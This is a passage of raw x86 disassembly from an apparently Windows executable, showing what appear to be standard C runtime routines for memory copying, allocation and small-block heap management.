  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
